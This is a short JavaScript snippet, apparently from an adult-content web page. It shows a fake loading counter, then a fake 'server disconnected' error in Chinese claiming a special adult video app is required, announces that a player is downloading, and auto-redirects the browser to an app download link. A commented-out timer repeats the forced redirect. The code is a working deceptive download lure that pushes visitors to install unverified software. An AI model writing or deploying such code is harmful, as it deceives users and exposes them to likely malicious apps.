var bar=0;
var line="||";
var amount="||";
count();
function count(){
	bar=bar+2;
	amount=amount+line;
	document.getElementById('baifenbi').innerHTML=bar+"%";
	if(bar<10){
		setTimeout("count()",50);
	}else{
		alert(tixing);
		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到<span style="color:#FF0033;">防屏蔽成人</span>手机专用APP！<span style="color:#339900;">高清内容，缓冲快，点击下载！</span></span></a>';
		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
		window.location.href=appurl2;
	}
}
//var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();
